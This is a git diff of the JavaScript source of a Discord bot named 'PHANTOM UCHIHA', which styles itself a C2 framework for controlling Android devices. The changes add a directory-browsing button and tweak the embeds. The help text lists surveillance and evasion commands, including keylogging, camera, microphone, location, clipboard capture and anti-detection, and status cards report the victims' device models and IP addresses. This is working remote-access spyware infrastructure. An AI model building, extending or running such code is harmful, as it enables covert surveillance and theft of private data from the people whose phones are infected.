@@ -2,6 +2,7 @@ import 'dotenv/config'
 import {
   Client, GatewayIntentBits, Events, Options,
   ChannelType, SlashCommandBuilder, EmbedBuilder, AttachmentBuilder,
+  ActionRowBuilder, ButtonBuilder, ButtonStyle,
   StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
 } from 'discord.js'
 import { ICONS } from './icons.js'
@@ -32,6 +33,7 @@ const commandLog = new Map()
 const commandCooldowns = new Map()
 const sentCommands = new Map()
 const alertCooldown = new Map()
+const statusCheckers = new Map()
 const deviceCheckLocks = new Set()
 const guildCheckLocks = new Set()
 
@@ -85,6 +87,7 @@ const B = {
   sms:        btn('sms',        'SMS',        '💬',       'primary'),
   location:   btn('location',   'LOCATION',   '📍',       'primary'),
   camera:     btn('camera',     'CAMERA',     '📷',       'danger'),
+  dir:        btn('dir',        'DIR',        '📁',       'primary'),
 }
 
 // ── Menu Layouts ─────────────────────────────────────────────────────────
@@ -276,7 +279,7 @@ function helpEmbed() {
       .setColor(C.sharingan)
       .setTitle(`${E.sharingan} PHANTOM UCHIHA — FULL COMMAND REFERENCE`)
       .setDescription(`\`\`\`ansi\n${box}\n\`\`\``)
-      .setThumbnail(randGif()).setImage(randGif())
+      .setThumbnail(randGif())
       .addFields(
         { name: `${E.zap} RECON`, value: '`!ping` `!sysinfo` `!antidetect` `!ip` `!uptime` `!battery`', inline: true },
         { name: `${E.eye} SURVEILLANCE`, value: '`!screenshot` `!camera` `!mic` `!location` `!clipboard` `!keylog` `!stream`', inline: true },
@@ -1085,7 +1088,7 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
         try {
           const mod = await import('./statusCard.js')
           const cardBuffer = mod.statusCard ? await mod.statusCard({ deviceName, status: online ? 'online' : 'offline', model: mModel !== '?' ? mModel : 'Unknown', android: mAndroid !== '?' ? mAndroid : 'Unknown', ip: mIp !== '?' ? mIp : 'Unknown', lastSeen: online ? 'now' : (lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'), theme: 'blood' }) : null
-          const e = new EmbedBuilder().setColor(online ? C.neon : C.void).setTitle(online ? `${E.check} ${ch.name} ONLINE ${E.check}` : `${E.coffin} ${ch.name} OFFLINE ${E.coffin}`).setThumbnail(randGif()).setImage(randGif())
+          const e = new EmbedBuilder().setColor(online ? C.neon : C.void).setTitle(online ? `${E.check} ${ch.name} ONLINE ${E.check}` : `${E.coffin} ${ch.name} OFFLINE ${E.coffin}`).setThumbnail(randGif())
             .addFields(
               { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
               { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
@@ -1165,7 +1168,7 @@ client.once(Events.ClientReady, async () => {
       await ch.send({
         embeds: [new EmbedBuilder().setColor(C.sharingan).setTitle(`${E.sharingan} ${bold('PHANTOM UCHIHA')}`)
           .setDescription(`**${E.sharingan} C2 Framework v3.1**\nGateway: Discord WebSocket\nStatus: ${E.flame} ACTIVE\nOnline: ${ts()}\n\nAwaiting commands...`)
-          .setThumbnail(randGif()).setImage(randGif()).setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })],
+          .setThumbnail(randGif()).setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })],
         components: MENU_BTNS,
       }).catch(err => console.error('Startup:', err.message))
     }
